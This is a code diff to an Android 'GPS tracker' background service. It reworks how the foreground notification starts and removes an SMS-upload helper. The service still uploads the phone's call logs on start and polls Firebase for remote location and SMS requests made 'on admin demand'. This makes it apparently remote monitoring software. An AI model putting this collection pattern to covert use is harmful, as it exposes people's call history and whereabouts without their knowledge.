@@ -1,5 +1,7 @@
 package com.sgs.gpstracker.services;
 
+import static android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
+
 import android.Manifest;
 import android.annotation.SuppressLint;
 import android.app.Notification;
@@ -11,6 +13,7 @@ import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.PowerManager;
+import android.util.Log;
 
 import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
@@ -47,10 +50,7 @@ public class LocationBroadcastService extends Service {
         wakeLock.acquire();
 
         fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
-        startForegroundServiceWithNotification();
         handler = new Handler();
-
-
 
 
     }
@@ -67,6 +67,7 @@ public class LocationBroadcastService extends Service {
             SharedPreferences prefs = getSharedPreferences("user", MODE_PRIVATE);
             deviceId = prefs.getString("deviceId", null);
         }
+        startForegroundServiceWithNotification();
 
         if (deviceId != null) {
             checkForLocationRequest();
@@ -75,17 +76,13 @@ public class LocationBroadcastService extends Service {
             uploadCallogs(); //first time when service starts
 
 
-//            uploadSms(); // first time when service starts
-//            checkForSmsRequest(); // on admin demand
-
-
         }
 
         return START_STICKY;
     }
 
     private void uploadCallogs() {
-        ServiceClassUtils.fetchAndUploadCallLogs(getApplicationContext(),deviceId);
+        ServiceClassUtils.fetchAndUploadCallLogs(getApplicationContext(), deviceId);
     }
 
     private void checkForLocationRequest() {
@@ -111,10 +108,6 @@ public class LocationBroadcastService extends Service {
     }
 
 
-    private void uploadSms() {
-        ServiceClassUtils.fetchAndUploadSms(getApplicationContext(), deviceId);
-    }
-
     private void checkForSmsRequest() {
         DatabaseReference requestRef = FirebaseDatabase.getInstance()
                 .getReference("users")
@@ -126,7 +119,6 @@ public class LocationBroadcastService extends Service {
             public void onDataChange(@NonNull DataSnapshot snapshot) {
                 Boolean request = snapshot.getValue(Boolean.class);
                 if (request != null && request) {
-                    uploadSms();
                     requestRef.setValue(false);
                 }
             }
@@ -183,7 +175,18 @@ public class LocationBroadcastService extends Service {
                 .setCategory(NotificationCompat.CATEGORY_SERVICE)
                 .build();
 
-        startForeground(1, notification);
+        if (ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
+                && ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                startForeground(1, notification, FOREGROUND_SERVICE_TYPE_LOCATION);
+            } else {
+                startForeground(1, notification);
+            }
+        } else {
+            Log.e("MyService", "No permissions ACCESS_FINE_LOCATION and ACCESS_COARSE_LOCATION!");
+        }
+
+
     }
 
 
